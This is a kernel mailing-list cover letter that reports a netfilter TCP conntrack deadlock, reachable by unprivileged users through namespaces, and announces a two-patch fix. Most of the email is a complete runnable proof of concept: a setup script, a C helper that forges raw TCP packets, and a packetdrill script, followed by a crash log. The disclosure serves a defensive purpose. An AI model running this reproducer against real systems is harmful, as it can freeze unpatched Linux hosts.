Received: from mail-pl1-f176.google.com (mail-pl1-f176.google.com [209.85.214.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 316663AFB18
	for <netfilter-devel@vger.kernel.org>; Thu, 30 Jul 2026 13:56:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785419777; cv=none; b=Twx+XWvcfHwDfWMPOMXmINVzFh/AEAbxR/F8qyJFeu+6CF4OyBX+VMkh/oRLmcxpTSH2IsrBe0JHu9Ve/jwk+GVl0uOVtmqT/tuD8H40I/b/ovkfI5xSMjAYpKooScj0XYQ+2op+XcdEsG7PfDpLf3yrMS9SXZlCCGigF/+XPWs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785419777; c=relaxed/simple;
	bh=NbUIjgXWQS/q11Y6AtYY2a3AQB7fe+uXl7J7D1duewo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=crrIIHkB7WFBAjqFpGG6sbm5HVyal+q7Y4r2gqzCQ72IL02KfBTayBQymWEYJmjJUU6FMls9KQxDG+s27qUM7ML635swL1tqPl9E8OsUqM8KKMkyhUZOcYfbWShQzWYKtLiLPCf1PSCK89xTuT+D7B2CJmk1yQUvoVoQCps2fas=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=psXbULe5; arc=none smtp.client-ip=209.85.214.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="psXbULe5"
Received: by mail-pl1-f176.google.com with SMTP id d9443c01a7336-2cca0c5799eso20993045ad.0
        for <netfilter-devel@vger.kernel.org>; Thu, 30 Jul 2026 06:56:14 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785419774; x=1786024574; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=I/mknX/F3j8bFgBqAz4ad7Kntw8u/ugru2bpSPYzwhY=;
        b=psXbULe58Z1GPiLaCCQnMU88zfls4ZiVRiDzCqc+2tUOZSwvjw/zi/iP6B50nqZiwF
         SXEIGLEJIWmB3+ZU4a9vKpulvedGFu8x9HLq2HcFmb47mSPNh7Ljj+gY/DERIbL6B6fJ
         GBniwxUhfJGPwIy8AVN5VlZFiwXiNvM5T4JfyanymzgRHj9LY81nc3NTcediInpqvy+q
         nPYimJnB9jz0Id0t9u3cvNTtvnPeQ5ljy3Ljrkjs1hH7WM2ajV7pQnkqDhA/3atW+znN
         PtacMduYJyEEJ28DgFjI0G2qY7pEa07KMua0/bbN+pTRBs1ANcma7td814kHqYgSmJcn
         BefQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785419774; x=1786024574;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=I/mknX/F3j8bFgBqAz4ad7Kntw8u/ugru2bpSPYzwhY=;
        b=E/z4TlULATaQ+G39QiMDheJkrpjQHun+grY6Bv0Sqk9iii/vr4y3m9C6ZD6scx3v9t
         ihKJXct3ELOAbxc0Tc9pMVkVPvhtp3ALHZrwohbDt6dbXSE64mRghpSZe07XpTD+HaZ+
         74GL0nlxaMjShHP1EUK144F1cOGmyYxqDxqcPXZsUPGbJADVoptNxZAYwiUSI74yXe6S
         L7hZMJMSGn0D4MFGn2P3TelP8HFZmbwIcqnKoEtPCoNcbdpihzw7BRCXtu5LkDG3PNPc
         zk/cmG2mttQEJKzm/ptjWQZZmzQRb5plJDFKXRiZFsO/7l0jLX00zRg38fx6Iy2uk3xX
         Jj2Q==
X-Gm-Message-State: AOJu0Yz248+ZW/7BkKLIu6BzLUfK0gxj0wrSP1xRkzx3/190ND+tUWS2
	feuxbPzEV3AJhIT6Jr+2uPOcJgmK4UtKv3JCfvRx6YCiR/eTuaYB9fZ1LoEWce/F4BJ8Y3grRue
	aTJ9IIBNz
X-Gm-Gg: AR+sD13C9glNJSiDfIDs1giUgIwoBFUj2oPt6ItqWPfnStbLBm4X647cfwLoILClc4N
	DqkaYGUzvZsrfTix8cNjRlvHdFQ/QZzmYtjwACCYc0Uhcj7pd8Z6aHirYjy+gTV0Lyv7uOFKi3N
	sUFhZ2aMwk5Cy0KB8h3dyKhItzaUhppQp6cctzgmshSfFBBX+sFLrCWQfBv0Zr+qTy5zxvYuT8C
	FQezKY91hdIxazA5wYyCkg3p5AddaVI6akxj1mHw6wyPsnvKD95W1eA+GWiZn0nhSuIxHBu9p5H
	7hNailpo3orqGD2mKn2yjcD+SaPrUSkYD9dDuKKrMNsZ0TXX2X2xchzuUcartGbxCl8MYokaluQ
	mKhGx/cqJN32K30tBVe5FoK2qLgo069ki63sqUhAZzQqoSq6YzrUAnWkobawQFHbnrQgrrD5om4
	yu6U8G4ssGgWunvKNgo2JhgytppdSJTFTCqsL+JLSomTyBCQ7buHAYObavYEAep8Sbc8nCaQk=
X-Received: by 2002:a17:903:b4b:b0:2cc:d69a:354a with SMTP id d9443c01a7336-2d035c939ccmr23826505ad.22.1785419774064;
        Thu, 30 Jul 2026 06:56:14 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d022c8b9aasm27398055ad.50.2026.07.30.06.56.09
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 30 Jul 2026 06:56:13 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	avagin@gmail.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH nf v2 0/2] netfilter: fix TCP conntrack invalid-log deadlock
Date: Thu, 30 Jul 2026 13:55:42 +0000
Message-ID: <cover.1785348197.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/nf_conntrack_proto_tcp.c.
The bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

nf_conntrack_tcp_packet() can log invalid TCP packets while ct->lock is
still held. This happens both in the tcp_in_window() -> nf_tcp_log_invalid()
path and in the NFCT_TCP_INVALID -> nf_tcp_handle_invalid() path.

When invalid logging is routed to nfnetlink_log and the NFLOG instance has
NFULNL_CFG_F_CONNTRACK enabled, nfulnl_log_packet() re-enters conntrack
serialization through ctnetlink_glue_build() and tcp_to_nlattr(). That
reaches the same conntrack again and tries to take ct->lock recursively,
which can deadlock the sender in queued_spin_lock_slowpath() and then lead
to RCU stall reports.

The deadlock requires three ingredients: a lock-held invalid log site,
invalid logging that can actually execute, and NFLOG conntrack export that
re-enters conntrack attribute dumping.

For the timeout-lowering path, the held-lock log site is introduced by
628d694344a0 ("netfilter: conntrack: reduce timeout when receiving
out-of-window fin or rst").

For the tcp_in_window() invalid logging path, the held-lock log site is
older, but the deadlock only becomes reachable once d48668052b26
("netfilter: fix nf_l4proto_log_invalid to log invalid packets") fixes the
invalid-log gating bug and allows those logs to execute. The earlier
a29a9a585b28 ("netfilter: nfnetlink_log: allow to attach conntrack") change
is still an important precondition because it first adds conntrack export to
NFLOG, but it is not the correct Fixes target for either patch in this
series.

In v2, this fix is split into two patches as suggested during review.
The first patch moves the timeout-lowering log from nf_tcp_handle_invalid()
out from under ct->lock, and the second patch handles the remaining
tcp_in_window() invalid logging cases with a smaller deferred-log state.
That removes the recursive lock acquisition without narrowing the
invalid-path coverage.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

The two lines above are kept to match the required cover-letter template.
The actual runnable reproducer for this bug is the wrapper flow below.

Actual files used in this reproduction:

    chmod +x run-poc-packetdrill.sh
    unshare -Urn ./run-poc-packetdrill.sh

The wrapper script compiles poc-packetdrill-helper.c, starts
./poc-packetdrill-helper nflog to enable an NFLOG instance with
NFULNL_CFG_F_CONNTRACK, and then runs packetdrill with
poc-packetdrill.pkt.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN run-poc-packetdrill.sh------
#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
HELPER="$DIR/poc-packetdrill-helper"
SCRIPT="$DIR/poc-packetdrill.pkt"
NFLOG_OUT="$DIR/verify/poc-packetdrill-nflog.txt"
PD_OUT="$DIR/verify/poc-packetdrill-run.txt"
ENV_OUT="$DIR/verify/poc-packetdrill-env.txt"

log_env() {
	{
		printf '=== %s ===\n' "$1"
		id
		uname -a
		printf -- 'nf_conntrack_log_invalid='
		cat /proc/sys/net/netfilter/nf_conntrack_log_invalid 2>/dev/null || true
		printf -- 'nf_log/2='
		cat /proc/sys/net/netfilter/nf_log/2 2>/dev/null || true
		printf -- 'nfnetlink_log proc:\n'
		cat /proc/net/netfilter/nfnetlink_log 2>/dev/null || true
		printf '\n'
	} >>"$ENV_OUT"
}

if ! command -v packetdrill >/dev/null 2>&1; then
	echo "packetdrill not found in PATH" >&2
	exit 127
fi

export XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-/tmp/xtables.lock}
: >"$ENV_OUT"

log_env before_setup

modprobe nfnetlink_log 2>>"$ENV_OUT" || true
printf 'nfnetlink_log' >/proc/sys/net/netfilter/nf_log/2 2>>"$ENV_OUT" || true

/usr/sbin/ip link set lo up
/usr/sbin/iptables-legacy -F
/usr/sbin/iptables-legacy -A INPUT -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
/usr/sbin/iptables-legacy -A OUTPUT -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
printf '6\n' > /proc/sys/net/netfilter/nf_conntrack_log_invalid

log_env after_setup

gcc -O2 -Wall -Wextra -o "$HELPER" "$DIR/poc-packetdrill-helper.c"

"$HELPER" nflog >"$NFLOG_OUT" 2>&1 &
NFLOG_PID=$!
cleanup() {
	kill "$NFLOG_PID" 2>/dev/null || true
	wait "$NFLOG_PID" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

packetdrill \
	--local_ip=192.0.2.1 \
	--remote_ip=192.0.2.2 \
	--gateway_ip=192.0.2.2 \
	--bind_port=8080 \
	"$SCRIPT" >"$PD_OUT" 2>&1
wait "$NFLOG_PID"
trap - EXIT INT TERM
------END run-poc-packetdrill.sh--------

------BEGIN poc-packetdrill-helper.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_conntrack.h>
#include <linux/netfilter/nfnetlink_log.h>
#include <linux/netlink.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/poll.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define IPV4_FAMILY 2
#define PROC_TCP_PATH "/proc/net/tcp"

static uint32_t nl_seq;

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static struct nlattr *nlattr_put(struct nlmsghdr *nlh, size_t maxlen,
				 uint16_t type, const void *data, uint16_t len)
{
	size_t attr_len = NLA_HDRLEN + len;
	size_t total = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(attr_len);
	struct nlattr *nla;

	if (total > maxlen) {
		errno = ENOSPC;
		return NULL;
	}

	nla = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	nla->nla_type = type;
	nla->nla_len = attr_len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	memset((char *)nla + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);
	nlh->nlmsg_len = total;
	return nla;
}

static void recv_ack(int fd, uint32_t seq)
{
	char buf[4096];
	struct nlmsghdr *nlh;
	ssize_t len;

	len = recv(fd, buf, sizeof(buf), 0);
	if (len < 0)
		die("recv netlink");

	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
	     nlh = NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_seq != seq)
			continue;
		if (nlh->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *err = NLMSG_DATA(nlh);

			if (err->error) {
				errno = -err->error;
				die("netlink ack");
			}
			return;
		}
	}

	fprintf(stderr, "missing netlink ack for seq=%u\n", seq);
	exit(EXIT_FAILURE);
}

static void send_config_msg(int fd, uint8_t family, uint16_t group,
			    bool with_cmd, uint8_t cmd,
			    bool with_mode, uint8_t mode, uint32_t range,
			    bool with_flags, uint16_t flags)
{
	char buf[512];
	struct {
		struct nlmsghdr nlh;
		struct nfgenmsg nfg;
	} *req = (void *)buf;

	memset(buf, 0, sizeof(buf));
	req->nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req->nfg));
	req->nlh.nlmsg_type = (NFNL_SUBSYS_ULOG << 8) | NFULNL_MSG_CONFIG;
	req->nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req->nlh.nlmsg_seq = ++nl_seq;
	req->nfg.nfgen_family = family;
	req->nfg.version = NFNETLINK_V0;
	req->nfg.res_id = htons(group);

	if (with_cmd) {
		struct nfulnl_msg_config_cmd cfg = {
			.command = cmd,
		};

		if (!nlattr_put(&req->nlh, sizeof(buf), NFULA_CFG_CMD,
				&cfg, sizeof(cfg)))
			die("nlattr_put cmd");
	}

	if (with_mode) {
		struct nfulnl_msg_config_mode cfg = {
			.copy_range = htonl(range),
			.copy_mode = mode,
		};

		if (!nlattr_put(&req->nlh, sizeof(buf), NFULA_CFG_MODE,
				&cfg, sizeof(cfg)))
			die("nlattr_put mode");
	}

	if (with_flags) {
		__be16 be_flags = htons(flags);

		if (!nlattr_put(&req->nlh, sizeof(buf), NFULA_CFG_FLAGS,
				&be_flags, sizeof(be_flags)))
			die("nlattr_put flags");
	}

	if (send(fd, buf, req->nlh.nlmsg_len, 0) < 0)
		die("send netlink");
	recv_ack(fd, req->nlh.nlmsg_seq);
}

static int setup_nflog(void)
{
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);

	if (fd < 0)
		die("socket NETLINK_NETFILTER");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind NETLINK_NETFILTER");

	send_config_msg(fd, IPV4_FAMILY, 0, true, NFULNL_CFG_CMD_PF_BIND,
			false, 0, 0, false, 0);
	send_config_msg(fd, IPV4_FAMILY, 0, true, NFULNL_CFG_CMD_BIND,
			false, 0, 0, false, 0);
	send_config_msg(fd, IPV4_FAMILY, 0, false, 0,
			true, NFULNL_COPY_META, 0, true,
			NFULNL_CFG_F_CONNTRACK);

	return fd;
}

static int wait_nflog(void)
{
	char buf[4096];
	struct pollfd pfd;
	int fd, ret;

	fd = setup_nflog();
	pfd.fd = fd;
	pfd.events = POLLIN;
	ret = poll(&pfd, 1, 2000);
	if (ret < 0)
		die("poll nflog");
	if (ret == 0) {
		fprintf(stderr, "no NFLOG packet received within 2 seconds\n");
		close(fd);
		return 1;
	}
	ret = recv(fd, buf, sizeof(buf), 0);
	if (ret < 0)
		die("recv nflog packet");
	fprintf(stderr, "received NFLOG packet (%d bytes)\n", ret);
	close(fd);
	return 0;
}

static uint16_t csum16(const void *data, size_t len)
{
	const uint16_t *p = data;
	uint32_t sum = 0;

	while (len > 1) {
		sum += *p++;
		len -= 2;
	}
	if (len)
		sum += *(const uint8_t *)p;
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return (uint16_t)~sum;
}

static uint16_t tcp_checksum(const struct iphdr *iph, const struct tcphdr *tcph)
{
	struct {
		uint32_t saddr;
		uint32_t daddr;
		uint8_t zero;
		uint8_t proto;
		uint16_t len;
		struct tcphdr tcph;
	} pseudo = {
		.saddr = iph->saddr,
		.daddr = iph->daddr,
		.zero = 0,
		.proto = IPPROTO_TCP,
		.len = htons(sizeof(struct tcphdr)),
		.tcph = *tcph,
	};

	return csum16(&pseudo, sizeof(pseudo));
}

static int find_established_tuple(uint16_t listen_port,
				 struct in_addr *src_ip, uint16_t *src_port,
				 struct in_addr *dst_ip, uint16_t *dst_port)
{
	FILE *fp;
	char line[512];

	fp = fopen(PROC_TCP_PATH, "r");
	if (!fp)
		die(PROC_TCP_PATH);

	if (!fgets(line, sizeof(line), fp)) {
		fclose(fp);
		return -1;
	}

	while (fgets(line, sizeof(line), fp)) {
		unsigned int sl;
		unsigned int lip_hex, lport_hex, rip_hex, rport_hex, state;
		struct in_addr lip, rip;

		if (sscanf(line,
			   " %u: %8X:%4X %8X:%4X %2X",
			   &sl, &lip_hex, &lport_hex, &rip_hex, &rport_hex, &state) != 6)
			continue;
		if (state != 0x01)
			continue;
		if (lport_hex != listen_port)
			continue;

		lip.s_addr = lip_hex;
		rip.s_addr = rip_hex;
		*src_ip = rip;
		*src_port = (uint16_t)rport_hex;
		*dst_ip = lip;
		*dst_port = (uint16_t)lport_hex;
		fclose(fp);
		return 0;
	}

	fclose(fp);
	return -1;
}

static void inject_invalid_from_proc(uint16_t listen_port,
				     uint32_t seq, uint32_t ack_seq)
{
	struct {
		struct iphdr ip;
		struct tcphdr tcp;
	} pkt;
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
	};
	struct in_addr src_ip, dst_ip;
	uint16_t src_port, dst_port;
	int one = 1;
	int fd;

	if (find_established_tuple(listen_port, &src_ip, &src_port,
				    &dst_ip, &dst_port) < 0) {
		errno = ENOENT;
		die("find_established_tuple");
	}

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0)
		die("socket raw");
	if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
		die("setsockopt IP_HDRINCL");

	dst.sin_addr = dst_ip;
	memset(&pkt, 0, sizeof(pkt));
	pkt.ip.version = 4;
	pkt.ip.ihl = sizeof(pkt.ip) / 4;
	pkt.ip.tot_len = htons(sizeof(pkt));
	pkt.ip.ttl = 64;
	pkt.ip.protocol = IPPROTO_TCP;
	pkt.ip.saddr = src_ip.s_addr;
	pkt.ip.daddr = dst_ip.s_addr;
	pkt.ip.check = csum16(&pkt.ip, sizeof(pkt.ip));

	pkt.tcp.source = htons(src_port);
	pkt.tcp.dest = htons(dst_port);
	pkt.tcp.seq = htonl(seq);
	pkt.tcp.ack_seq = htonl(ack_seq);
	pkt.tcp.doff = sizeof(pkt.tcp) / 4;
	pkt.tcp.ack = 1;
	pkt.tcp.window = htons(1024);
	pkt.tcp.check = tcp_checksum(&pkt.ip, &pkt.tcp);

	fprintf(stderr,
		"injecting forged ACK %s:%u -> %s:%u seq=%#x ack=%#x\n",
		inet_ntoa(src_ip), src_port, inet_ntoa(dst_ip), dst_port,
		seq, ack_seq);

	if (sendto(fd, &pkt, sizeof(pkt), 0,
		   (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sendto raw");
	close(fd);
}

int main(int argc, char **argv)
{
	if (argc >= 2 && !strcmp(argv[1], "nflog"))
		return wait_nflog();
	if (argc == 5 && !strcmp(argv[1], "inject-from-proc")) {
		uint16_t listen_port = (uint16_t)strtoul(argv[2], NULL, 0);
		uint32_t seq = (uint32_t)strtoul(argv[3], NULL, 0);
		uint32_t ack_seq = (uint32_t)strtoul(argv[4], NULL, 0);

		inject_invalid_from_proc(listen_port, seq, ack_seq);
		return 0;
	}

	fprintf(stderr,
		"usage: %s nflog | inject-from-proc <listen_port> <seq> <ack>\n",
		argv[0]);
	return 2;
}
------END poc-packetdrill-helper.c--------

------BEGIN poc-packetdrill.pkt------
// packetdrill version of the TCP conntrack invalid-log deadlock PoC.
//
// This script uses packetdrill for the TCP state machine part and a small
// helper binary for the two userspace-only tasks that packetdrill does not
// cover well here:
//   1) enabling an NFLOG instance with NFULNL_CFG_F_CONNTRACK
//   2) injecting the final forged raw ACK based on the live tuple
//
// Expected behavior:
//   - vulnerable kernel: the helper injects the forged ACK, conntrack enters
//     the recursive ct->lock logging path, and the expected duplicate ACK
//     below never arrives
//   - fixed kernel: the duplicate ACK is emitted and the NFLOG helper also
//     receives a packet carrying conntrack attributes

0.000 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
+0.000 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0.000 bind(3, ..., ...) = 0
+0.000 listen(3, 1) = 0

+0.000 < S 0:0(0) win 32792 <mss 1460,nop,wscale 7>
+0.000 > S. 0:0(0) ack 1 <...>
+0.010 < . 1:1(0) ack 1 win 32792
+0.000 accept(3, ..., ...) = 4

+0.000 write(4, ..., 1) = 1
+0.000 > P. 1:2(1) ack 1
+0.010 < . 1:1(0) ack 2 win 32792

+0.000 < P. 1:2(1) ack 2 win 32792
+0.000 read(4, ..., 1) = 1
+0.000 > . 2:2(0) ack 2

+0.010 `./poc-packetdrill-helper inject-from-proc 8080 268435458 2`
+0.020 > . 2:2(0) ack 2
+0.200 `sleep 0.2`
------END poc-packetdrill.pkt--------

----BEGIN crash log----
[   86.136409] rcu: INFO: rcu_preempt self-detected stall on CPU
[   86.560968] CPU: 1 UID: 0 PID: 1021 Comm: poc-packetdrill Not tainted 7.2.0-rc3-00417-ge13caf1c2658 #6 PREEMPT(lazy)
[   86.560972] RIP: queued_spin_lock_slowpath+0x85/0x290
[   86.561012] Call Trace:
[   86.561019]  <TASK>
[   86.561021]  __instance_destroy+0x32/0x80
[   86.561876]  nfulnl_rcv_nl_event+0x82/0xa0
[   86.561994]  netlink_release+0x5e1/0x650
[   86.562993]  </TASK>
[   86.563918] CPU: 0 UID: 0 PID: 1034 Comm: poc-packetdrill Not tainted 7.2.0-rc3-00417-ge13caf1c2658 #6 PREEMPT(lazy)
[   86.563924] RIP: queued_spin_lock_slowpath+0x85/0x290
[   86.563947] Call Trace:
[   86.563948]  <TASK>
[   86.563949]  tcp_to_nlattr+0x3d/0x1a0
[   86.563984]  ctnetlink_dump_protoinfo.constprop.0+0x5c/0x90
[   86.564068]  ctnetlink_glue_build+0x264/0x3e0
[   86.564097]  nfulnl_log_packet+0x57d/0xba0
[   86.564185]  nf_l4proto_log_invalid+0xc6/0xe0
[   86.564189]  nf_ct_l4proto_log_invalid+0xb8/0xc0
[   86.564196]  nf_tcp_log_invalid+0x9b/0xc0
[   86.564560]  nf_conntrack_tcp_packet+0x4ff/0x1680
[   86.565087]  nf_conntrack_in+0x19f/0x4d0
[   86.565093]  raw_sendmsg+0xc31/0xe20
[   86.565343]  __x64_sys_sendto+0x1f/0x30
[   86.565348]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   86.565368]  </TASK>
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (2):
  netfilter: nf_conntrack_tcp: defer timeout-lowering invalid log until
    after unlock
  netfilter: nf_conntrack_tcp: defer tcp_in_window invalid logging until
    after unlock

 net/netfilter/nf_conntrack_proto_tcp.c | 138 +++++++++++++++++--------
 1 file changed, 94 insertions(+), 44 deletions(-)

-- 
2.43.0

